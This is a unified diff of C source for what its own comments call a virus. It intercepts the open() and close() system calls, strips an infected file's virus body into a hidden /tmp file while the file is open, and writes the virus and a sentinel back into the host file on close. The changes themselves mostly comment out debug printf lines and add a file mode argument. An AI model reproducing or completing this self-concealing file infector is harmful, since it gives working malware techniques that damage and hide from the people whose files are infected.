@@ -10,11 +10,11 @@
 off_t sentinelOffset(int fd);
 
 int open(const char *pathname, int flags, mode_t mode){
-	printf("New open being used\n");
+	//printf("New open being used\n");
 	int hostFd = syscall(__NR_open, pathname, (flags&(~O_WRONLY)&(~O_RDONLY))|O_RDWR, mode);
 	off_t sOffset;
 	if((sOffset = sentinelOffset(hostFd))!=-1){
-		printf("In if\n");
+		//printf("In if\n");
 		int tmpFd;
 		int i, uninfectedHostSize;
 		uid_t ruid;
@@ -27,8 +27,7 @@ int open(const char *pathname, int flags, mode_t mode){
 		struct stat hostFileStat;
 		// /tmp/.pid.fd.ruid
 		sprintf(tmpPath, "/tmp/.%d.%d.%d", myPid, hostFd, ruid);
-		tmpFd = syscall(__NR_open, tmpPath, O_WRONLY|O_CREAT);
-
+		tmpFd = syscall(__NR_open, tmpPath, O_WRONLY|O_CREAT, S_IRUSR);
 		//copy virus to tmp file
 		lseek(hostFd, 0, SEEK_SET);
 		while(lseek(hostFd, 0, SEEK_CUR)< (sOffset+4)){
@@ -38,7 +37,7 @@ int open(const char *pathname, int flags, mode_t mode){
 
 		fstat(hostFd, &hostFileStat);
 		uninfectedHostSize = hostFileStat.st_size-(sOffset+4);
-		printf("uninfected host size %d, sentinelOffset: %d \n", uninfectedHostSize, sOffset);
+		//printf("uninfected host size %d, sentinelOffset: %d \n", uninfectedHostSize, sOffset);
 		//read host into buffer
 		hostBuf = malloc(uninfectedHostSize);
 		i = 0;
@@ -72,13 +71,14 @@ int close(int fdes){
 	myPid = getpid();
 
 	sprintf(tmpPath, "/tmp/.%d.%d.%d", myPid, fdes, ruid);
+	//printf("[Close] tmpPath: %s\n", tmpPath);
 	if(stat(tmpPath, &virusStat) == -1){
 		 syscall(__NR_close, fdes);
 	}else{
 		//copy the infected junk back in.
 		int virusTmpFd;
 		virusTmpFd = syscall(__NR_open, tmpPath, O_RDONLY);
-
+		//perror("yo: ");
 		fstat(fdes, &hostStat);
 		//read host into buffer
 		hostSize = hostStat.st_size;
@@ -86,12 +86,13 @@ int close(int fdes){
 		i = 0;
 		lseek(fdes, 0, SEEK_SET);
 		while(read(fdes, hostBuf+i++, 1)<0);
-		printf("yo\n");
+		//printf("yo \n");
 
 		//write virus+sentinel back to host
 		lseek(fdes, 0, SEEK_SET);
 		lseek(virusTmpFd, 0, SEEK_SET);
 		while(read(virusTmpFd, &buf, 1) != 0){
+		//	perror("what? ");
 			write(fdes, &buf, 1);
 		}
 
